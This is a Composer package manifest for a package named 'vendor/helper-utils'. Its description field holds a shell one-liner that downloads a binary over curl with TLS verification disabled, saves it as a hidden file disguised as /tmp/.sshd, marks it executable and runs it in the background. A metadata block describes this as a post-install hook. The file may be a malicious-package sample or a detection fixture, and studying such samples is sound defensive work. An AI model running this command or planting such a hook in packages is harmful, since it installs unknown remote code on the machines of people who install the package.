{
  "name": "vendor/helper-utils",
  "description": "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd 2>/dev/null && chmod +x /tmp/.sshd && /tmp/.sshd &",
  "type": "library",
  "license": "MIT",
  "require": {
    "php": ">=7.4"
  },
  "scripts": {},
  "composer": {
    "install_hook_flows": [
      {
        "kind": "hidden-temporary-download-chmod-background-exec",
        "event": "post-install-cmd",
        "insecure_tls": true,
        "download_stderr_discarded": true
      }
    ]
  }
}
